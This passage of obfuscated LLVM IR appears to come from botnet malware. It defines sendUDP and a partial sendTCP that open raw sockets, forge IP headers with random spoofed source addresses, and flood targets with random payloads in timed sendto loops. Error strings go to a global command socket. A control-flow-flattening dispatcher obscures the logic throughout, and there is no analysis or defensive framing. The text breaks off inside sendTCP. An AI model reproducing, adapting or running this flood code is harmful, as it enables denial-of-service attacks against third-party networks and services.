  %83 = load i32, i32* %12, align 4
  %84 = add i32 %83, 1
  store i32 %84, i32* %12, align 4
  store i32 -600298753, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %82, %81, %61, %51, %25, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  store i32 %35, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1655168014, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1655168014, label %first
    i32 -1830861130, label %38
    i32 -334809578, label %42
    i32 -231568078, label %47
    i32 1574912516, label %53
    i32 -2082496979, label %54
    i32 -1243797983, label %61
    i32 -1597199264, label %66
    i32 -1877072596, label %69
    i32 -1939478406, label %77
    i32 -829386558, label %78
    i32 747282742, label %88
    i32 -1992788858, label %99
    i32 90804317, label %103
    i32 -1506653653, label %107
    i32 1708672455, label %112
    i32 -1075876385, label %113
    i32 171081056, label %114
    i32 1547121984, label %121
    i32 -1659886697, label %125
    i32 -733317221, label %128
    i32 -1569470536, label %129
    i32 -609729628, label %134
    i32 1519078745, label %137
    i32 -308296208, label %143
    i32 134345957, label %146
    i32 -1889894708, label %147
    i32 -1315928247, label %152
    i32 437953212, label %157
    i32 -1443447166, label %161
    i32 1430367278, label %162
    i32 1440604024, label %168
    i32 1083818186, label %208
    i32 -1219460836, label %210
    i32 -1019540815, label %215
    i32 -1758405490, label %240
    i32 -376022023, label %241
    i32 -1592158924, label %254
    i32 637981215, label %256
    i32 1894737652, label %261
    i32 -773885481, label %288
    i32 -847072567, label %293
    i32 -2097197627, label %294
    i32 -1028879212, label %295
    i32 -1788849489, label %302
    i32 1341234837, label %306
    i32 -812764487, label %309
    i32 -1835677745, label %311
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %36 = icmp eq i32 %.reload, 0
  %37 = select i1 %36, i32 -1830861130, i32 -334809578
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = call i32 @rand_cmwc()
  %40 = trunc i32 %39 to i16
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %40, i16* %41, align 2
  store i32 -231568078, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #13
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  store i32 -231568078, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %9, align 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %50 = call i32 @getHost(i8* %48, %struct.in_addr* %49)
  %51 = icmp ne i32 %50, 0
  %52 = select i1 %51, i32 1574912516, i32 -2082496979
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 -1835677745, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %56 = getelementptr inbounds [8 x i8], [8 x i8]* %55, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 8, i32 4, i1 false)
  %57 = load i32, i32* %14, align 4
  store i32 %57, i32* %18, align 4
  %58 = load i32, i32* %12, align 4
  %59 = icmp eq i32 %58, 32
  %60 = select i1 %59, i32 -1243797983, i32 -1569470536
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %62, i32* %19, align 4
  %63 = load i32, i32* %19, align 4
  %64 = icmp ne i32 %63, 0
  %65 = select i1 %64, i32 -1877072596, i32 -1597199264
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* @mainCommSock, align 4
  %68 = call i32 (i32, i8*, ...) @sockprintf(i32 %67, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i32 0, i32 0))
  store i32 -1835677745, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %13, align 4
  %71 = add nsw i32 %70, 1
  %72 = sext i32 %71 to i64
  %73 = call noalias i8* @malloc(i64 %72) #2
  store i8* %73, i8** %20, align 8
  %74 = load i8*, i8** %20, align 8
  %75 = icmp eq i8* %74, null
  %76 = select i1 %75, i32 -1939478406, i32 -829386558
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 -1835677745, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %20, align 8
  %80 = load i32, i32* %13, align 4
  %81 = add nsw i32 %80, 1
  %82 = sext i32 %81 to i64
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 %82, i32 1, i1 false)
  %83 = load i8*, i8** %20, align 8
  %84 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %83, i32 %84)
  %85 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %86 = load i32, i32* %11, align 4
  %87 = add nsw i32 %85, %86
  store i32 %87, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 747282742, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %19, align 4
  %90 = load i8*, i8** %20, align 8
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %94 = call i64 @sendto(i32 %89, i8* %90, i64 %92, i32 0, %struct.sockaddr* %93, i32 16)
  %95 = load i32, i32* %22, align 4
  %96 = load i32, i32* %18, align 4
  %97 = icmp eq i32 %95, %96
  %98 = select i1 %97, i32 -1992788858, i32 171081056
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %10, align 4
  %101 = icmp eq i32 %100, 0
  %102 = select i1 %101, i32 90804317, i32 -1506653653
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = call i32 @rand_cmwc()
  %105 = trunc i32 %104 to i16
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %105, i16* %106, align 2
  store i32 -1506653653, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %109 = load i32, i32* %21, align 4
  %110 = icmp sgt i32 %108, %109
  %111 = select i1 %110, i32 1708672455, i32 -1075876385
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  store i32 -733317221, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 747282742, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %22, align 4
  %116 = add i32 %115, 1
  store i32 %116, i32* %22, align 4
  %117 = load i32, i32* %23, align 4
  %118 = load i32, i32* %15, align 4
  %119 = icmp eq i32 %117, %118
  %120 = select i1 %119, i32 1547121984, i32 -1659886697
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %16, align 4
  %123 = mul nsw i32 %122, 1000
  %124 = call i32 @usleep(i32 %123)
  store i32 0, i32* %23, align 4
  store i32 747282742, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i32, i32* %23, align 4
  %127 = add i32 %126, 1
  store i32 %127, i32* %23, align 4
  store i32 747282742, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -1835677745, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %130, i32* %24, align 4
  %131 = load i32, i32* %24, align 4
  %132 = icmp ne i32 %131, 0
  %133 = select i1 %132, i32 1519078745, i32 -609729628
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i32, i32* @mainCommSock, align 4
  %136 = call i32 (i32, i8*, ...) @sockprintf(i32 %135, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i32 0, i32 0))
  store i32 -1835677745, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  store i32 1, i32* %25, align 4
  %138 = load i32, i32* %24, align 4
  %139 = bitcast i32* %25 to i8*
  %140 = call i32 @setsockopt(i32 %138, i32 0, i32 3, i8* %139, i32 4) #2
  %141 = icmp slt i32 %140, 0
  %142 = select i1 %141, i32 -308296208, i32 134345957
  store i32 %142, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load i32, i32* @mainCommSock, align 4
  %145 = call i32 (i32, i8*, ...) @sockprintf(i32 %144, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.74, i32 0, i32 0))
  store i32 -1835677745, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 50, i32* %26, align 4
  store i32 -1889894708, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i32, i32* %26, align 4
  %149 = add nsw i32 %148, -1
  store i32 %149, i32* %26, align 4
  %150 = icmp ne i32 %148, 0
  %151 = select i1 %150, i32 -1315928247, i32 437953212
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %154 = call i32 @rand_cmwc()
  %155 = xor i32 %153, %154
  call void @srand(i32 %155) #2
  %156 = call i32 @rand() #2
  call void @init_rand(i32 %156)
  store i32 -1889894708, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32, i32* %12, align 4
  %159 = icmp eq i32 %158, 0
  %160 = select i1 %159, i32 -1443447166, i32 1430367278
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  store i32 0, i32* %27, align 4
  store i32 1440604024, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i32, i32* %12, align 4
  %164 = sub nsw i32 32, %163
  %165 = shl i32 1, %164
  %166 = sub nsw i32 %165, 1
  %167 = xor i32 %166, -1
  store i32 %167, i32* %27, align 4
  store i32 1440604024, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32, i32* %13, align 4
  %170 = sext i32 %169 to i64
  %171 = add i64 28, %170
  store i64 %171, i64* %.reg2mem2
  %172 = call i8* @llvm.stacksave()
  store i8* %172, i8** %28, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %173 = alloca i8, i64 %.reload4, align 16
  store i8* %173, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %174 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %174, %struct.iphdr** %29, align 8
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = bitcast %struct.iphdr* %175 to i8*
  %177 = getelementptr i8, i8* %176, i64 20
  %178 = bitcast i8* %177 to %struct.udphdr*
  store %struct.udphdr* %178, %struct.udphdr** %30, align 8
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %181 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %180, i32 0, i32 0
  %182 = load i32, i32* %181, align 4
  %183 = load i32, i32* %27, align 4
  %184 = call i32 @GetRandomIP(i32 %183)
  %185 = call i32 @htonl(i32 %184) #13
  %186 = load i32, i32* %13, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 8, %187
  %189 = trunc i64 %188 to i32
  call void @makeIPPacket(%struct.iphdr* %179, i32 %182, i32 %185, i8 zeroext 17, i32 %189)
  %190 = load i32, i32* %13, align 4
  %191 = sext i32 %190 to i64
  %192 = add i64 8, %191
  %193 = trunc i64 %192 to i16
  %194 = call zeroext i16 @htons(i16 zeroext %193) #13
  %195 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %196 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %195, i32 0, i32 0
  %197 = bitcast %union.anon.3* %196 to %struct.anon.4*
  %198 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %197, i32 0, i32 2
  store i16 %194, i16* %198, align 2
  %199 = call i32 @rand_cmwc()
  %200 = trunc i32 %199 to i16
  %201 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %202 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %201, i32 0, i32 0
  %203 = bitcast %union.anon.3* %202 to %struct.anon.4*
  %204 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %203, i32 0, i32 0
  store i16 %200, i16* %204, align 2
  %205 = load i32, i32* %10, align 4
  %206 = icmp eq i32 %205, 0
  %207 = select i1 %206, i32 1083818186, i32 -1219460836
  store i32 %207, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = call i32 @rand_cmwc()
  store i32 -1019540815, i32* %switchVar
  store i32 %209, i32* %.reg2mem10
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = load i32, i32* %10, align 4
  %212 = trunc i32 %211 to i16
  %213 = call zeroext i16 @htons(i16 zeroext %212) #13
  %214 = zext i16 %213 to i32
  store i32 -1019540815, i32* %switchVar
  store i32 %214, i32* %.reg2mem10
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %216 = trunc i32 %.reload11 to i16
  %217 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %218 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %217, i32 0, i32 0
  %219 = bitcast %union.anon.3* %218 to %struct.anon.4*
  %220 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %219, i32 0, i32 1
  store i16 %216, i16* %220, align 2
  %221 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %222 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %221, i32 0, i32 0
  %223 = bitcast %union.anon.3* %222 to %struct.anon.4*
  %224 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %223, i32 0, i32 3
  store i16 0, i16* %224, align 2
  %225 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %226 = bitcast %struct.udphdr* %225 to i8*
  %227 = getelementptr inbounds i8, i8* %226, i64 8
  %228 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %227, i32 %228)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %229 = bitcast i8* %.reload8 to i16*
  %230 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 2
  %232 = load i16, i16* %231, align 2
  %233 = zext i16 %232 to i32
  %234 = call zeroext i16 @csum(i16* %229, i32 %233)
  %235 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 7
  store i16 %234, i16* %236, align 2
  %237 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %238 = load i32, i32* %11, align 4
  %239 = add nsw i32 %237, %238
  store i32 %239, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  store i32 -1758405490, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 -376022023, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = load i32, i32* %24, align 4
  %243 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %244 = call i64 @sendto(i32 %242, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %243, i32 16)
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %248 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon.3* %248 to %struct.anon.4*
  %250 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %249, i32 0, i32 0
  store i16 %246, i16* %250, align 2
  %251 = load i32, i32* %10, align 4
  %252 = icmp eq i32 %251, 0
  %253 = select i1 %252, i32 -1592158924, i32 637981215
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = call i32 @rand_cmwc()
  store i32 1894737652, i32* %switchVar
  store i32 %255, i32* %.reg2mem12
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = load i32, i32* %10, align 4
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #13
  %260 = zext i16 %259 to i32
  store i32 1894737652, i32* %switchVar
  store i32 %260, i32* %.reg2mem12
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %262 = trunc i32 %.reload13 to i16
  %263 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %264 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %263, i32 0, i32 0
  %265 = bitcast %union.anon.3* %264 to %struct.anon.4*
  %266 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %265, i32 0, i32 1
  store i16 %262, i16* %266, align 2
  %267 = call i32 @rand_cmwc()
  %268 = trunc i32 %267 to i16
  %269 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 3
  store i16 %268, i16* %270, align 4
  %271 = load i32, i32* %27, align 4
  %272 = call i32 @GetRandomIP(i32 %271)
  %273 = call i32 @htonl(i32 %272) #13
  %274 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 8
  store i32 %273, i32* %275, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %276 = bitcast i8* %.reload6 to i16*
  %277 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 2
  %279 = load i16, i16* %278, align 2
  %280 = zext i16 %279 to i32
  %281 = call zeroext i16 @csum(i16* %276, i32 %280)
  %282 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 7
  store i16 %281, i16* %283, align 2
  %284 = load i32, i32* %32, align 4
  %285 = load i32, i32* %18, align 4
  %286 = icmp eq i32 %284, %285
  %287 = select i1 %286, i32 -773885481, i32 -1028879212
  store i32 %287, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %290 = load i32, i32* %31, align 4
  %291 = icmp sgt i32 %289, %290
  %292 = select i1 %291, i32 -847072567, i32 -2097197627
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 -812764487, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  store i32 0, i32* %32, align 4
  store i32 -1758405490, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i32, i32* %32, align 4
  %297 = add i32 %296, 1
  store i32 %297, i32* %32, align 4
  %298 = load i32, i32* %33, align 4
  %299 = load i32, i32* %15, align 4
  %300 = icmp eq i32 %298, %299
  %301 = select i1 %300, i32 -1788849489, i32 1341234837
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i32, i32* %16, align 4
  %304 = mul nsw i32 %303, 1000
  %305 = call i32 @usleep(i32 %304)
  store i32 0, i32* %33, align 4
  store i32 -1758405490, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load i32, i32* %33, align 4
  %308 = add i32 %307, 1
  store i32 %308, i32* %33, align 4
  store i32 -1758405490, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %310)
  store i32 -1835677745, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %309, %306, %302, %295, %294, %293, %288, %261, %256, %254, %241, %240, %215, %210, %208, %168, %162, %161, %157, %152, %147, %146, %143, %137, %134, %129, %128, %125, %121, %114, %113, %112, %107, %103, %99, %88, %78, %77, %69, %66, %61, %54, %53, %47, %42, %38, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1765423562, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1765423562, label %first
    i32 289069659, label %31
    i32 523240627, label %35
    i32 -1724675449, label %40
    i32 -1804232489, label %46
    i32 -566108390, label %47
    i32 242417484, label %54
    i32 -344754102, label %57
    i32 1739054377, label %63
    i32 -1647824190, label %66
    i32 -560668627, label %70
    i32 288256552, label %71
    i32 -1415977359, label %77
    i32 457464796, label %125
    i32 1036832537, label %161
    i32 1205193885, label %164
    i32 1786133599, label %168
    i32 -279357792, label %173
    i32 1929567370, label %181
    i32 -872876083, label %186
    i32 1179513952, label %194
    i32 1888758845, label %199
    i32 1567803482, label %207
    i32 1095088128, label %212
    i32 -72823926, label %220
    i32 1149984824, label %225
    i32 1449974180, label %233
    i32 -259846845, label %237
    i32 530570046, label %238
    i32 -2042600370, label %239
    i32 1373259166, label %240
    i32 -1659406993, label %241
    i32 311984758, label %243
    i32 -1978999005, label %244
    i32 860297288, label %262
    i32 1177244087, label %264
    i32 -1456448047, label %269
    i32 -13313955, label %293
    i32 1010298892, label %294
    i32 516781000, label %341
    i32 -373585798, label %346
    i32 513089299, label %347
    i32 590455956, label %348
    i32 390336409, label %351
    i32 -713875968, label %353
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 289069659, i32 523240627
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 -1724675449, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 -1724675449, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 -1804232489, i32 -566108390
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -713875968, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 -344754102, i32 242417484
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i32 0, i32 0))
  store i32 -713875968, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %58 = load i32, i32* %17, align 4
  %59 = bitcast i32* %18 to i8*
  %60 = call i32 @setsockopt(i32 %58, i32 0, i32 3, i8* %59, i32 4) #2
  %61 = icmp slt i32 %60, 0
  %62 = select i1 %61, i32 1739054377, i32 -1647824190
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.74, i32 0, i32 0))
  store i32 -713875968, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %11, align 4
  %68 = icmp eq i32 %67, 0
  %69 = select i1 %68, i32 -560668627, i32 288256552
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 -1415977359, i32* %switchVar
  br label %loopEnd

